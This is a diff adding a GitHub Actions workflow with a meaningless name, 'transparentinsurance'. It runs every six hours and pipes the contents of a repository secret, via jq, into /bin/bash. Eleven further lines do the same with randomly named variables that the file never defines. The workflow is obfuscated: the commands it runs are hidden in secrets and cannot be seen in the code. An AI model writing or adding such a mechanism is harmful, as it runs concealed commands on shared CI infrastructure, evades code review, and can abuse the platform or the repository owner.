@@ -1,0 +1,28 @@
+name: transparentinsurance
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: transparentinsurance
+        env:
+          megk9219: ${{ secrets.megk9219 }}
+        run: |
+          echo $megk9219 | jq -r .ye24494 | /bin/bash
+          echo $ad233 | jq -r .fjidm73105 | /bin/bash
+          echo $poohp6 | jq -r .u46 | /bin/bash
+          echo $yo7326 | jq -r .oc0736 | /bin/bash
+          echo $m8018 | jq -r .pyn913 | /bin/bash
+          echo $afdt3 | jq -r .mvk93674 | /bin/bash
+          echo $l88486 | jq -r .huqg512 | /bin/bash
+          echo $zd38821 | jq -r .va23 | /bin/bash
+          echo $viorb6711 | jq -r .ayy956 | /bin/bash
+          echo $w6829 | jq -r .ocab1 | /bin/bash
+          echo $xd1575 | jq -r .gnsia74 | /bin/bash
+          echo $mrnnx96876 | jq -r .ja6279 | /bin/bash
+
